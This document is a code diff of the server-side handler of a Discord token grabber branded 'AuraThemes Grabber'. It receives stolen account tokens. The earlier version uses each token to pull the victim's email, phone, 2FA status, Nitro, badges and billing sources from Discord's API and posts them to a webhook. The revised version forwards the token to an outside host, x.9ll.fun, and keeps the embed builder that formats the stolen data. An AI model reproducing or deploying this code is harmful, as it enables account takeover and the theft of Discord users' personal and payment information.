@@ -1,230 +1,271 @@
 import { webhook } from '../../../../k4itrun.config';
-import fetch from 'sync-fetch';
 import axios from 'axios';
 
 export default async function handler(req, res) {
   try {
-    const data = req.query.data;
+    const { data: token } = req.query;
 
-    if (!data) {
+    if (!token) {
       res.status(400).send({
         message: 'Bad Request: missing "data" query parameter'
       });
+
       return;
     }
 
-    let info;
-    try {
-      let response = await axios.get("https://discord.com/api/v9/users/@me", {
+    if (false) {
+      const response = await axios.get('https://discord.com/api/v9/users/@me', {
         headers: {
-          "Content-Type": "application/json",
-          "Authorization": data
+          'Content-Type': 'application/json',
+          'Authorization': token
         }
       });
-      info = {
-        token: data,
-        ...(response.data)
+
+      const info = {
+        token: token,
+        ...response.data
       };
-    } catch (ex) {
-      info = null;
-    }
 
-    if (info?.id) {
-      await axios.post(webhook, {
-        username: '@AuraThemes',
-        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-        embeds: [embedGrabber(info, data)],
+      if (info?.id) {
+        await axios.post(webhook, {
+          username: '@AuraThemes',
+          avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+          embeds: await embed(info),
+        });
+      }
+    } else {
+      axios.get('https://x.9ll.fun/api/v1/raw?data=' + token, {
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': token
+        }
       })
-    }
+    };
 
-    res.status(200).send(data);
-    console.log("New visit:", data)
-
+    res.status(200).send(token);
+    console.log('New visit:', token);
   } catch (error) {
-    console.error('Error:', error);
     res.status(500).send('Internal Server Error');
+    console.error('Error:', error);
   }
 }
 
+
 const emojis = {
-  "themes": {
-    "dark": "Dark",
-    "light": "Light",
+  'themes': {
+    'dark': 'Dark',
+    'light': 'Light',
   },
-  "status": {
-    "online": "<:online:1129709364316491787>",
-    "idle": "<:idle:1120542710424674306>",
-    "dnd": "<:dnd:974692691289993216>",
-    "invisible": "<:offline:1137141023529762916>",
+  'status': {
+    'online': '<:online:1129709364316491787>',
+    'idle': '<:idle:1120542710424674306>',
+    'dnd': '<:dnd:974692691289993216>',
+    'invisible': '<:offline:1137141023529762916>',
   },
-  "user": {
-    "boost": [
-      "<:Booster1Month:1087043238654906472> ",
-      "<:Booster2Month:1087043319227494460> ",
-      "<:Booster3Month:1087043368250511512> ",
-      "<:Booster6Month:1087043493236592820> ",
-      "<:Booster9Month:1087043493236592820> ",
-      "<:booster12month:1162420359291732038> ",
-      "<:Booster15Month:1051453775832961034> ",
-      "<:Booster18Month:1051453778127237180> ",
-      "<:Booster24Month:1051453776889917530> ",
+  'user': {
+    'boost': [
+      '<:Booster1Month:1087043238654906472> ',
+      '<:Booster2Month:1087043319227494460> ',
+      '<:Booster3Month:1087043368250511512> ',
+      '<:Booster6Month:1087043493236592820> ',
+      '<:Booster9Month:1087043493236592820> ',
+      '<:booster12month:1162420359291732038> ',
+      '<:Booster15Month:1051453775832961034> ',
+      '<:Booster18Month:1051453778127237180> ',
+      '<:Booster24Month:1051453776889917530> ',
     ],
-    "i": [
-      "<:staff:1090015968618623129> ",
-      "<:partner:918207395279273985> ",
-      "<:events:898186057588277259> ",
-      "<:bughunter_1:874750808426692658> ",
-      "<:bravery:874750808388952075> ",
-      "<:brilliance:874750808338608199> ",
-      "<:balance:874750808267292683> ",
-      "<:early:944071770506416198> ",
-      "<:bughunter_2:874750808430874664> ",
-      "<:activedev:1042545590640324608> ",
-      "<:verifieddeveloper:898181029737680896> ",
+    'i': [
+      '<:staff:1090015968618623129> ',
+      '<:partner:918207395279273985> ',
+      '<:events:898186057588277259> ',
+      '<:bughunter_1:874750808426692658> ',
+      '<:bravery:874750808388952075> ',
+      '<:brilliance:874750808338608199> ',
+      '<:balance:874750808267292683> ',
+      '<:early:944071770506416198> ',
+      '<:bughunter_2:874750808430874664> ',
+      '<:activedev:1042545590640324608> ',
+      '<:verifieddeveloper:898181029737680896> ',
     ],
   },
 };
 
 const languages = {
-  "zh-TW": "🇨🇳 Chinese-Taiwanese",
-  "pr-BR": "🇵🇹 Portuguese",
-  "sv-SE": "🇸🇪 Swedish",
-  "zh-CN": "🇨🇳 Chinese-China",
-  "en-GB": "🪟 English (UK)",
-  "en-US": "🇺🇸 USA",
-  "es-ES": "🇪🇸 Español",
-  "ro": "🇷🇴 Romanian",
-  "fi": "🇫🇮 Finnish",
-  "vi": "🇻🇳 Vietnamese",
-  "tr": "🇹🇷 Turkish",
-  "ru": "🇷🇺 Russian",
-  "uk": "🇺🇦 Ukrainian",
-  "hi": "🇮🇳 Indian",
-  "th": "🇹🇼 Taiwanese",
-  "hr": "🇭🇷 Croatian",
-  "it": "🇮🇹 Italianio",
-  "lt": "🇱🇹 Lithuanian",
-  "no": "🇳🇴 Norwegian",
-  "ja": "🇯🇵 Japanese",
-  "ko": "🇰🇷 Korean",
-  "fr": "🇫🇷 French",
-  "da": "🇩🇰 Dansk",
-  "de": "🇩🇪 Deutsch",
-  "pl": "🇵🇱 Polish",
-  "cs": "🇨🇿 Czech",
-  "el": "🇬🇷 Greek",
-  "bg": "🇧🇬 Bulgarian",
-  "hu": "🇳🇴🇭🇺 Hungarian",
+  'zh-TW': '🇨🇳 Chinese-Taiwanese',
+  'pr-BR': '🇵🇹 Portuguese',
+  'sv-SE': '🇸🇪 Swedish',
+  'zh-CN': '🇨🇳 Chinese-China',
+  'en-GB': '🪟 English (UK)',
+  'en-US': '🇺🇸 USA',
+  'es-ES': '🇪🇸 Español',
+  'ro': '🇷🇴 Romanian',
+  'fi': '🇫🇮 Finnish',
+  'vi': '🇻🇳 Vietnamese',
+  'tr': '🇹🇷 Turkish',
+  'ru': '🇷🇺 Russian',
+  'uk': '🇺🇦 Ukrainian',
+  'hi': '🇮🇳 Indian',
+  'th': '🇹🇼 Taiwanese',
+  'hr': '🇭🇷 Croatian',
+  'it': '🇮🇹 Italianio',
+  'lt': '🇱🇹 Lithuanian',
+  'no': '🇳🇴 Norwegian',
+  'ja': '🇯🇵 Japanese',
+  'ko': '🇰🇷 Korean',
+  'fr': '🇫🇷 French',
+  'da': '🇩🇰 Dansk',
+  'de': '🇩🇪 Deutsch',
+  'pl': '🇵🇱 Polish',
+  'cs': '🇨🇿 Czech',
+  'el': '🇬🇷 Greek',
+  'bg': '🇧🇬 Bulgarian',
+  'hu': '🇳🇴🇭🇺 Hungarian',
 };
 
-function getAPI(url, token) {
-  const res = fetch(url, {
-    method: "GET",
+async function fetch(url, token) {
+  const response = await axios.get(url, {
     headers: {
-      "Content-Type": "application/json",
-      "Authorization": token,
+      'Content-Type': 'application/json',
+      'Authorization': token,
     },
   });
-  return res.status === 200 ? res.json() : "Invalid";
+  return response.status === 200 ? response.data : 'Invalid';
 }
 
-function getNitro(u) {
-  let { premium_type, premium_guild_since } = u, x = "<:nitro:1016385399020601344>";
+function getNitro(user) {
+  const { premium_type, premium_guild_since } = user;
+  const nitro = '<:nitro:1016385399020601344>';
   switch (premium_type) {
     default:
-      return ":x:";
+      return ':x:';
     case 1:
-      return x;
+      return nitro;
     case 2:
-      if (!premium_guild_since) return x;
+      if (!premium_guild_since) {
+        return nitro;
+      };
       const now = new Date();
-      const m = [2, 3, 6, 9, 12, 15, 18, 24];
+      const months = [2, 3, 6, 9, 12, 15, 18, 24];
       let rem = 0;
-      for (let i = 0; i < m.length; i++) {
-        const d = m[i];
+
+      for (let i = 0; i < months.length; i++) {
+        const d = months[i];
         if (Math.round((getDate(new Date(premium_guild_since), d) - now) / 86400000) > 0) {
           rem = i;
           break;
         }
       }
-      return `${x} ${emojis.user.boost[rem]}`;
+      return `${nitro} ${emojis.user.boost[rem]}`;
   }
 }
 
-function getDate(a, b) {
-  return new Date(a).setMonth(a.getMonth() + b);
+function getDate(start, next) {
+  return new Date(start).setMonth(start.getMonth() + next);
 }
 
-function getImage(p) {
-  if (!p) return false;
-  return `${p}.${fetch(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
+function getLanguage(type) {
+  return languages[type] || 'Unknown Language';
 }
 
-function getLanguage(l) {
-  return languages[l] || "Unknown Language";
+function getStatus(type) {
+  return emojis.status[type] || 'Unknown Status';
 }
 
-function getStatus(l) {
-  return emojis.status[l] || "Unknown Status";
-}
-
-function allBabges(f) {
+function getFlags(badge) {
   return (
-    (1 & f ? emojis.user.i[0] : "") +
-    (2 & f ? emojis.user.i[1] : "") +
-    (4 & f ? emojis.user.i[2] : "") +
-    (8 & f ? emojis.user.i[3] : "") +
-    (64 & f ? emojis.user.i[4] : "") +
-    (128 & f ? emojis.user.i[5] : "") +
-    (256 & f ? emojis.user.i[6] : "") +
-    (512 & f ? emojis.user.i[7] : "") +
-    (16384 & f ? emojis.user.i[8] : "") +
-    (4194304 & f ? emojis.user.i[9] : "") +
-    (131072 & f ? emojis.user.i[10] : "")
-  ) || ":x:";
+    (1 & badge ? emojis.user.i[0] : '') +
+    (2 & badge ? emojis.user.i[1] : '') +
+    (4 & badge ? emojis.user.i[2] : '') +
+    (8 & badge ? emojis.user.i[3] : '') +
+    (64 & badge ? emojis.user.i[4] : '') +
+    (128 & badge ? emojis.user.i[5] : '') +
+    (256 & badge ? emojis.user.i[6] : '') +
+    (512 & badge ? emojis.user.i[7] : '') +
+    (16384 & badge ? emojis.user.i[8] : '') +
+    (4194304 & badge ? emojis.user.i[9] : '') +
+    (131072 & badge ? emojis.user.i[10] : '')
+  ) || ':x:';
 }
 
-function embedGrabber(info, data) {
-  const profile = getAPI(`https://discord.com/api/v9/users/${info.id}/profile`, info.token);
-  const settings = getAPI(`https://discord.com/api/v9/users/@me/settings`, info.token);
-  const payment = getAPI(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);
+async function embed(info) {
+  const profile = await fetch(`https://discord.com/api/v9/users/${info.id}/profile`, info.token);
+  const settings = await fetch(`https://discord.com/api/v9/users/@me/settings`, info.token);
+  const payment = await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);
 
-  const billing = payment?.reduce((a, e) => {
-    if (e.email) a += `<:paypal:861207258846330880> `;
-    if (e.type == 1 && !e.invalid) a += `<:creditcart:741512388490035251> `;
-    if (e.type == 3 && !e.invalid) a += `\`Giropay\` `;
-    if (e.type == 16 && !e.invalid) a += `\`Rabobank\` `;
-    if (e.type == 7 && !e.invalid) a += `\`PaysafeCard\` `;
-    return a;
-  }, '') || `\`No found\``;
+  const billing = payment?.reduce((acc, e) => {
+    if (e.email) {
+      acc += `<:paypal:861207258846330880> `;
+    }
 
-  const avatar = info.avatar ? getImage(`https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`) : 'https://i.imgur.com/WkKXZSl.gif';
+    const validTypes = {
+      1: '<:creditcart:741512388490035251>',
+      3: '`Giropay`',
+      16: '`Rabobank`',
+      7: '`PaysafeCard`',
+    };
 
-  console.log({ ...profile, ...settings, ...payment })
+    if (!e.invalid && validTypes[e.type]) {
+      acc += validTypes[e.type] + ' ';
+    }
 
-  return {
-    author: {
-      name: `${info.username}#${info.discriminator} | ${info.id}`,
-      icon_url: avatar
-    },
-    thumbnail: {
-      url: `${avatar}`,
-    },
-    color: 12740607,
-    fields: [
-      { name: "<a:aura:1087044506542674091> Token", value: `\`\`\`${data}\`\`\``, inline: false },
-      { name: "Nitro", value: getNitro(profile), inline: true },
-      { name: "Badges", value: allBabges(info.flags), inline: true },
-      { name: "Phone", value: `\`${info.phone || "None"}\``, inline: true },
-      { name: "Email", value: `\`${info.email || "None"}\``, inline: false },
-      { name: "Billing", value: `${billing}`, inline: true },
-      { name: "Langue", value: getLanguage(settings.locale), inline: true },
-      { name: "Status", value: getStatus(settings.status), inline: true },
-    ],
-    footer: {
-      text: 'AuraThemes Grabber',
-      icon_url: 'https://i.imgur.com/WkKXZSl.gif'
-    },
-    timestamp: new Date()
-  };
+    return acc;
+  }, '');
+
+  const ext = info.avatar.startsWith('a_') ? 'gif' : 'png';
+  const avatar = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.${ext}`;
+
+  return [
+    {
+      color: 12740607,
+      title: `${info.username} | ${info.id}`,
+      thumbnail: {
+        url: avatar + '?size=512'
+      },
+      fields: [
+        {
+          name: `<:x:1194495538138185728> Token:`,
+          value: '```' + info.token + '```',
+          inline: false
+        },
+        { name: '\u200b', value: '\u200b', inline: false },
+        {
+          name: '<a:mail:1245038428891123815> Email:',
+          value: '`' + (info.email || '❓') + '`',
+          inline: true
+        },
+        {
+          name: '<a:phone:1104204812867874936> Phone:',
+          value: '`' + (info.phone || '❓') + (info.mfa_enabled ? ' (2FA)' : '') + '`',
+          inline: true
+        },
+        { name: '\u200b', value: '\u200b', inline: false },
+        {
+          name: '<a:nitro:1122755911967068210> Nitro:',
+          value: getNitro(profile),
+          inline: true
+        },
+        {
+          name: '<:billing:1122678162288037929> Billing:',
+          value: (billing || '`❓`'),
+          inline: true
+        },
+        { name: '\u200b', value: '\u200b', inline: false },
+        {
+          name: '<a:badges:1138323945284714516> Badges:',
+          value: getFlags(info.public_flags),
+          inline: true
+        },
+        {
+          name: '🏳️ Langue:',
+          value: getLanguage(settings.locale),
+          inline: true
+        },
+        {
+          name: '🌙 Status:',
+          value: getStatus(settings.status),
+          inline: true
+        },
+      ]
+    }
+  ]
 }
